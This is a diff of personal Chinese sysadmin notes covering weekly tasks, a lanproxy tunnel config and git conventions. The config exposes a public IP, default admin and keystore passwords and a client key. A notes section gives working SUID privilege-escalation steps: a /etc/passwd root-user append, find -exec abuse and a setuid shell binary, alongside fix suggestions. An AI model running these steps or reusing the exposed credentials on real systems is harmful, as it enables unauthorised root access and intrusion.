@@ -128,7 +128,7 @@ appid+secret，拼接的[地址为](https://api.weixin.qq.com/cgi-bin/token?gran
 
 - 获取结果的最后一列, 例如  docker ps -a | awk '{print $NF}'
 
-- 哦，remote-ssh连接上后，打开文件夹，之后再开终端才会是你写代码的那个路径a
+- 哦，remote-ssh连接上后，打开文件夹，之后再开终端才会是你写代码的那个路径
 
 汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇汇报报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报
 weekly：
@@ -137,7 +137,11 @@ weekly：
 
 周一：写/修改文档，智能会议系统管理用户指南_V3.1 & V3.0
 周二：党群工作部，处理乱码问题，以及整理后续更新建议
-周三：
+
+周三：测试会议系统。创建华为软开云新账号。
+    防火墙添加映射，公网IP:80
+
+周四：
 
 西藏那边的巡检，是月巡检--？
 1. 会议系统:
@@ -166,7 +170,7 @@ weekly：
     2. 最近部署smartone测试环境，可以搞个dockerfile，就不必这么麻烦了
 
 4. smartone， 环境部署脚本， 方便其他客户（比如，windows） 快速搭建部署环境
-    版本信息，
+5. **隐藏linux进程**。 大隐于内核，还是小隐于用户。
 
 ---
 
@@ -481,123 +485,207 @@ unixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunix
     set, 显示特定进程的所有环境变量集.其中除了全局,还有本地环境变量
     标准约定: 若要创建新环境变量,则建议使用小写字母.用于区分个人与系统环境变量
 
-15. Git， 七大基本原则
-    1. 每次commit只做一件事。 linux中心原则是，所有更改都必须分解为小步骤进行。针对某一项单一任务的更改
-    2. commit不能破坏构建。 不仅应该将所有更改分解为尽可能小的变量（上一条），而且不能破坏内核（就内核维护而言）。 即每个步骤都必须完全起作用，并且不引起退化。
-    3. 所有代码都是二等分的。 二等分是一种操作，它使开发者可以找到所有发生错误的确切时间点。 只有在遵守上面的规则的情况下，才能很好起作用。开发者可以在十几次编译/测试中，从成千上万的可能 commit 中分离出导致问题出现的 commit 。Git 甚至可以通过 git bisect 功能帮助自动化该过程
-    4. 永远不要rebase 公共分支。 linux项目工作流程不允许这样，因为rebase这些公共分支后，已重新基准化的commit 将不再与 基于原存储库中的相同 commit 匹配
-        在树的层次结构中，不是叶子的公共主干部分 不能重新设置基准，否则将会破坏层次结构中的下游分支。
+16. 内网穿透~了解
+    lanproxy，代理，本质上是通过公网ip:端口，来访问到你的内网服务器上所映射端口，上的服务~
+    [可参考此](https://github.com/ffay/lanproxy)
 
-    5. git正确合并。
-    6. 保留定义明确的commit 日志。 每个commit都必须是独立的， 这也应该包括与commit相应的日志。内核贡献者（就内核维护而言） 必须在更改的commit 日志中做出说明，让所有人了解与正在进行的更改相关的所有内容
-        git blame来查看。编写良好的代码更改日志可以帮助确定是否可以删除改代码或如何对其进行修改
+    目前，我是在xizang 所属服务器上搭建了Server 端；在内网linux搭建了client端。通过`ssh root@221.236.26.67 -p 5222` 来远程到内网linux
 
-    7. 持续测试和集成。 linux-next是一个公共仓库，任何人都可以测试它。
+    再一个client端，是部署在了win10工作机上，mstsc远程目的机即可。此过程使用的是，服务端所属服务器上的带宽。此方法比向日葵要稳定些。
 
-13. 修改之前已commit 的某次注释信息，
-    git rebase -i HEAD~3                                显示倒数三次注释。要修改哪次注释，就将前面的pick改成edit，
-    git commit --amend                                  按照terminal 给出的提示，修改你要修改的注释，然后保存退出。接着回到本地最新的版本，
-    git rebase --continue                               会提示， Successfully rebased and updated refs/heads/master.
-    git add -A（如果你在这期间， 对文件有更改）            所以说，你在修改注释的时候，就不要改动文件了
+    <img src="https://gitee.com/liuzel01/picbed/raw/master/data/20210318115145_lanproxy_web_win.png" alt="image-20210318115145615" style="zoom:80%;" />
 
-14. 拉取指定分支的代码，
+    1. 比方说，以下，是我Server端（部署在公网服务器/云服务器）上的配置，proxy-server-0.1/conf/config.properties
 
-    `git clone -b meeting_standard_v3.0 http://192.168.10.68:8000/meeting/meeting.git`
+    ```latex
+    server.bind=0.0.0.0
+    # 与代理客户端通信端口
+    server.port=14900
+    
+    # ssl相关配置
+    server.ssl.enable=true
+    server.ssl.bind=0.0.0.0
+    server.ssl.port=14903
+    server.ssl.jksPath=test.jks
+    server.ssl.keyStorePassword=123456
+    server.ssl.keyManagerPassword=123456
+    # 配置可忽略
+    server.ssl.needsClientAuth=false
+    
+    # WEB在线配置管理相关信息
+    config.server.bind=0.0.0.0
+    config.server.port=18090
+    config.admin.username=admin
+    config.admin.password=admin123
+    ```
 
-15. 规范使用 git commit
+    以下，是我client端（部署在内网服务器/目的机）的配置，proxy-client-0.1/conf/config.properties
 
-     ```text
-     type(必须)
-     用于说明git commit的类别，只允许使用下面的标识。
-     feat：新功能（feature）。
-     fix/to：修复bug，可以是QA发现的BUG，也可以是研发自己发现的BUG。
-         fix：产生diff并自动修复此问题。适合于一次提交直接修复问题
-         to：只产生diff不自动修复此问题。适合于多次提交。最终修复问题提交时使用fix
-     docs：文档（documentation）。
-     style：格式（不影响代码运行的变动）。
-     
-     refactor：重构（即不是新增功能，也不是修改bug的代码变动）。
-     perf：优化相关，比如提升性能、体验。
-     test：增加测试。
-     chore：构建过程或辅助工具的变动。
-     revert：回滚到上一个版本。
-     merge：代码合并。
-     sync：同步主线或分支的Bug。
-     ```
+    ```latex
+    # client.key=client
+    # 在Server-WEB端-添加客户端-生成随机秘钥后，填写进配置文件
+    client.key=55154da57451494c9d81bad09f28416e
+    ssl.enable=true
+    ssl.jksPath=test.jks
+    ssl.keyStorePassword=123456
+    
+    # server.host=127.0.0.1
+    server.host=221.236.26.67
+    
+    # default ssl port is 4993
+    # 注意端口与服务端端口保持一致。 因为ssl.enable 都为true
+    server.port=14903
+    ```
 
-     1. commit message 格式： <type>(<scope>): <subject>
-     2. 下面举几个例子： 按照使用频率排列
+    1. 注意启动后，随时看日志，方便实时检查问题
+    2. 这是Server-WEB端截图
+       1. 客户端管理-客户端列表，注意“状态”一列，要为“在线”才可
 
-     ```text
-     feat： 创建项目
-         feat： 添加数据页面xxxxxx
-     style： 修改文本格式
-     test： 用于xxxx相关测试
-     perf： 增加用户交互选项
-         perf： 优化判断语句
-     fix：  xxx详情页面，展示不全，滚动条不能xxxx
-     docs： 新增xxxx文档
-     refactor： 修改网站名字为xxxx网
-     ```
+    <img src="https://gitee.com/liuzel01/picbed/raw/master/data/20210318101403_lanproxy_web.png" alt="image-20210318101403437" style="zoom:80%;" />
 
-16. 删除 /data/lscgdj目录下， 10天之前的tar.gz 包
-    find /data/lscgdj -name "*-backup-onlywebinf.tar.gz" -a -mtime +10 -exec rm -rf {} \; &>/dev/null
+---
 
-17. win10环境，使用 vscode remote ssh 远程连接服务器，免密连接
+**注：**
 
-    cmd, ssh-keygen -t rsa,                             生成秘钥
-    将win10 上的 用户/user01/.ssh/id_rsa.pub 上传到服务器的 /root/.ssh/  目录下，
-        cat id_rsa.pub  >> authorized_keys
+1. 可用nginx配置反向代理，转发ssh服务。 使用stream模块，需要编译安装nginx时， --with-stream 
+2. 基本配置可参考，
 
-    本来，试讲win10上面的资料mount 挂载到虚拟机 centos7mini 上去的。 现在发现，用远程服务器可以同样实现，大功告成。 不过这样的话，虽然本地资源压力减轻，但是安全性就没了。
+```reStructuredText
+# 需要stream 模块，要重新编译安装nginx
+# stream {
+# upstream ssh {
+# server 221.236.26.67:52115;
+# }
+# 
+# server {
+# 	listen 81;
+# 	proxy_pass ssh;
+# 	proxy_connect_timeout 1h;
+# 	proxy_timeout 1h;
+# }
+# }
+```
 
-18. [ ! -n "$JAVA_HOME" ] && echo 'is null'             判断一个变量是否为空
 
-19. 条理清晰，有理有据
 
-19. suid 提权示例，
-    1. 比如cp
-    find / -type f -perm -u=s 2>/dev/null               搜索具有suid权限的可执行文件，
-    chmod u+s /bin/cp                                   root用户给cp一个权限，做测试
-    ll /usr/bin/cp
+1. Git， 七大基本原则
 
-    cp /etc/passwd passwd                               普通用户，开始操作
-    openssl passwd -1 -salt l01 123456
-    echo 'l01:$1$l01$.a5onqEPLUMqiokxhSrBy.:0:0::/root/:/bin/bash' >>passwd          按照passwd 文件格式来添加一条
-    cp passwd  /etc/passwd                               将passwd 复制回去，
+   1. 每次commit只做一件事。 linux中心原则是，所有更改都必须分解为小步骤进行。针对某一项单一任务的更改
+   2. commit不能破坏构建。 不仅应该将所有更改分解为尽可能小的变量（上一条），而且不能破坏内核（就内核维护而言）。 即每个步骤都必须完全起作用，并且不引起退化。
+   3. 所有代码都是二等分的。 二等分是一种操作，它使开发者可以找到所有发生错误的确切时间点。 只有在遵守上面的规则的情况下，才能很好起作用。开发者可以在十几次编译/测试中，从成千上万的可能 commit 中分离出导致问题出现的 commit 。Git 甚至可以通过 git bisect 功能帮助自动化该过程
+   4. 永远不要rebase 公共分支。 linux项目工作流程不允许这样，因为rebase这些公共分支后，已重新基准化的commit 将不再与 基于原存储库中的相同 commit 匹配
+       在树的层次结构中，不是叶子的公共主干部分 不能重新设置基准，否则将会破坏层次结构中的下游分支。
 
-    su - l01                                             接下来，就可以切换到新建的用户了， 并且l01用户权限为root， 已提权
-    id                                                   能看到uid, gid, uid=0(root) gid=0(root) groups=0(root)
-    cat /etc/passwd | tail -1
-    同理，awk， sed这类具有写文件权限的命令以suid权限，都可以造成提权
-    2. find suid 给find提权后，可以以 exec 参数，以root权限执行任意命令
-    chmod u+s /bin/find                                  先给一个权限， 做测试
-    find ./ -name "passwd" -exec "id" \;                 find ./ -type f -name "nohup" -exec cp '{}' /etc/passwd \;可执行任一命令
-    执行，vim 再打开文件就可以编辑平常不能编辑的文件
+   5. git正确合并。
+   6. 保留定义明确的commit 日志。 每个commit都必须是独立的， 这也应该包括与commit相应的日志。内核贡献者（就内核维护而言） 必须在更改的commit 日志中做出说明，让所有人了解与正在进行的更改相关的所有内容
+       git blame来查看。编写良好的代码更改日志可以帮助确定是否可以删除改代码或如何对其进行修改
 
-    **修复建议： 将cp的 suid去除**
-    3. 给vim 授权限后， 一切皆文件，好开始接龙吧
-    4. 二进制程序权限滥用特权提升
-    cat > sudo.c <<eof
-    #include <stdio.h>
-    #include <sys/types.h>
-    #include <unistd.h>
-    int main(void)
-    {
-        setuid(0);
-        system("/bin/bash");
-        return 0;
-    }
-    gcc -o sudo sudo.c      chmod +s sudo
-    ./sudo                                                普通用户执行二进制文件， 就可以获取到root权限
+   7. 持续测试和集成。 linux-next是一个公共仓库，任何人都可以测试它。
 
-    **修复建议： 取消suid文件suid权限**
-    **合理配置nfs权限，禁止写入**
-    **清除历史记录，不直接在命令行中使用命令**
-    5. 内核提权，
-    **修复建议， 升级内核版本，使用最新版的ubuntu**
-    6. lxc提权，
-    7. docker提权
+2. 修改之前已commit 的某次注释信息，
+   git rebase -i HEAD~3                                显示倒数三次注释。要修改哪次注释，就将前面的pick改成edit，
+   git commit --amend                                  按照terminal 给出的提示，修改你要修改的注释，然后保存退出。接着回到本地最新的版本，
+   git rebase --continue                               会提示， Successfully rebased and updated refs/heads/master.
+   git add -A（如果你在这期间， 对文件有更改）            所以说，你在修改注释的时候，就不要改动文件了
+
+3. 拉取指定分支的代码，
+
+   `git clone -b meeting_standard_v3.0 http://192.168.10.68:8000/meeting/meeting.git`
+
+4. 规范使用 git commit
+
+    ```text
+    type(必须)
+    用于说明git commit的类别，只允许使用下面的标识。
+    feat：新功能（feature）。
+    fix/to：修复bug，可以是QA发现的BUG，也可以是研发自己发现的BUG。
+        fix：产生diff并自动修复此问题。适合于一次提交直接修复问题
+        to：只产生diff不自动修复此问题。适合于多次提交。最终修复问题提交时使用fix
+    docs：文档（documentation）。
+    style：格式（不影响代码运行的变动）。
+    
+    refactor：重构（即不是新增功能，也不是修改bug的代码变动）。
+    perf：优化相关，比如提升性能、体验。
+    test：增加测试。
+    chore：构建过程或辅助工具的变动。
+    revert：回滚到上一个版本。
+    merge：代码合并。
+    sync：同步主线或分支的Bug。
+    ```
+
+    1. commit message 格式： <type>(<scope>): <subject>
+    2. 下面举几个例子： 按照使用频率排列
+
+    ```text
+    feat： 创建项目
+        feat： 添加数据页面xxxxxx
+    style： 修改文本格式
+    test： 用于xxxx相关测试
+    perf： 增加用户交互选项
+        perf： 优化判断语句
+    fix：  xxx详情页面，展示不全，滚动条不能xxxx
+    docs： 新增xxxx文档
+    refactor： 修改网站名字为xxxx网
+    ```
+
+5. 删除 /data/lscgdj目录下， 10天之前的tar.gz 包
+   find /data/lscgdj -name "*-backup-onlywebinf.tar.gz" -a -mtime +10 -exec rm -rf {} \; &>/dev/null
+
+6. win10环境，使用 vscode remote ssh 远程连接服务器，免密连接
+
+   cmd, ssh-keygen -t rsa,                             生成秘钥
+   将win10 上的 用户/user01/.ssh/id_rsa.pub 上传到服务器的 /root/.ssh/  目录下，
+       cat id_rsa.pub  >> authorized_keys
+
+   本来，试讲win10上面的资料mount 挂载到虚拟机 centos7mini 上去的。 现在发现，用远程服务器可以同样实现，大功告成。 不过这样的话，虽然本地资源压力减轻，但是安全性就没了。
+
+7. [ ! -n "$JAVA_HOME" ] && echo 'is null'             判断一个变量是否为空
+
+8. 条理清晰，有理有据
+
+9. suid 提权示例，
+   1. 比如cp
+   find / -type f -perm -u=s 2>/dev/null               搜索具有suid权限的可执行文件，
+   chmod u+s /bin/cp                                   root用户给cp一个权限，做测试
+   ll /usr/bin/cp
+
+   cp /etc/passwd passwd                               普通用户，开始操作
+   openssl passwd -1 -salt l01 123456
+   echo 'l01:$1$l01$.a5onqEPLUMqiokxhSrBy.:0:0::/root/:/bin/bash' >>passwd          按照passwd 文件格式来添加一条
+   cp passwd  /etc/passwd                               将passwd 复制回去，
+
+   su - l01                                             接下来，就可以切换到新建的用户了， 并且l01用户权限为root， 已提权
+   id                                                   能看到uid, gid, uid=0(root) gid=0(root) groups=0(root)
+   cat /etc/passwd | tail -1
+   同理，awk， sed这类具有写文件权限的命令以suid权限，都可以造成提权
+   2. find suid 给find提权后，可以以 exec 参数，以root权限执行任意命令
+   chmod u+s /bin/find                                  先给一个权限， 做测试
+   find ./ -name "passwd" -exec "id" \;                 find ./ -type f -name "nohup" -exec cp '{}' /etc/passwd \;可执行任一命令
+   执行，vim 再打开文件就可以编辑平常不能编辑的文件
+
+   **修复建议： 将cp的 suid去除**
+   3. 给vim 授权限后， 一切皆文件，好开始接龙吧
+   4. 二进制程序权限滥用特权提升
+   cat > sudo.c <<eof
+   #include <stdio.h>
+   #include <sys/types.h>
+   #include <unistd.h>
+   int main(void)
+   {
+       setuid(0);
+       system("/bin/bash");
+       return 0;
+   }
+   gcc -o sudo sudo.c      chmod +s sudo
+   ./sudo                                                普通用户执行二进制文件， 就可以获取到root权限
+
+   **修复建议： 取消suid文件suid权限**
+   **合理配置nfs权限，禁止写入**
+   **清除历史记录，不直接在命令行中使用命令**
+   5. 内核提权，
+   **修复建议， 升级内核版本，使用最新版的ubuntu**
+   6. lxc提权，
+   7. docker提权
 
 faqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaq
 
